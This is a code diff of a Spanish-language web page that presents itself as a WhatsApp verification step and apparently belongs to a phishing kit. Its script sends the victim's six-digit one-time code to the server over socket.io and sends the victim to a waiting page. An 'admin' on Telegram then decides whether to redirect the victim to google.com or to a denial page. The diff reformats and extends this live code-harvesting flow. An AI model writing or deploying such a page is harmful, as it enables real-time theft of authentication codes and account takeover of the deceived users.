@@ -85,38 +85,42 @@
     <h2>Ingrese el código recibido por WhatsApp</h2>
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" value="" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
     </div>
     <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
     <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
- <script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
-  const sessionId = localStorage.getItem("sessionId");
-  socket.emit("reconectar", sessionId);
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const sessionId = localStorage.getItem("sessionId");
 
-  function reintentarCodigo() {
-    const codigo = document.getElementById("codigo").value;
+    socket.emit("reconectar", sessionId);
 
-    if (!codigo || !/^\d{6}$/.test(codigo)) {
-      alert("Ingrese un código válido de 6 dígitos.");
-    } else {
-      // Enviar código ingresado
+    function reintentarCodigo() {
+      const codigo = document.getElementById("codigo").value;
+
+      if (!codigo || !/^\d{6}$/.test(codigo)) {
+        alert("Ingrese un código válido de 6 dígitos.");
+        return;
+      }
+
+      // Enviar OTP ingresado al servidor
       socket.emit("otpIngresado", { codigo, sessionId });
-    }
-  }
 
-  // Escuchar respuesta del admin por Telegram
-  socket.on("respuestaOtp", (decision) => {
-    if (decision === "finalizar") {
-      window.location.href = "https://www.google.com";
-    } else if (decision === "otp_error") {
-      window.location.href = "denegado.html";
+      // Ir a la pantalla de espera
+      window.location.href = "opciones.html";
     }
-  });
-</script>
 
+    // Recibir respuesta del admin desde Telegram
+    socket.on("respuestaOtp", (decision) => {
+      if (decision === "finalizar") {
+        window.location.href = "https://www.google.com";
+      } else if (decision === "otp_error") {
+        window.location.href = "denegado.html";
+      }
+    });
+  </script>
 </body>
 </html>
